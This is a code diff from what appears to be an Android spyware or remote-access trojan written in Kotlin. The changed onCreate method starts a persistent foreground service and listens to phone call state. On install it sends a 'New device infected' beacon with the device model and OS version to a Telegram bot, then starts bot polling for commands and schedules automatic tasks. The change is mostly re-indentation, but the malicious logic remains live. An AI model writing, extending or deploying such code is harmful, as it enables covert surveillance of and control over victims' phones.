@@ -57,22 +57,26 @@ class MyService : Service() {
         }
     }
 
-    override fun onCreate() {
-        super.onCreate()
-        createNotificationChannel()
-        startForeground(1, buildForegroundNotification())
-        telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
-        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
 
-        // প্রথমবার install এ message পাঠাও
-        CoroutineScope(Dispatchers.IO).launch {
-            sendTelegramMessage("✅ New device infected: ${Build.MODEL} (${Build.VERSION.RELEASE})")
-        }
 
-        startBotPolling()
-        scheduleAutoTasks()
+override fun onCreate() {
+    super.onCreate()
+    createNotificationChannel()
+    startForeground(1, buildForegroundNotification())
+    telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+    telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
+
+    // প্রথমবার install এ message পাঠাও (COROUTINE এর ভিতরে)
+    CoroutineScope(Dispatchers.IO).launch {
+        sendTelegramMessage("✅ New device infected: ${Build.MODEL} (${Build.VERSION.RELEASE})")
     }
 
+    startBotPolling()
+    scheduleAutoTasks()
+}
+
+
+    
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
 
     override fun onDestroy() {
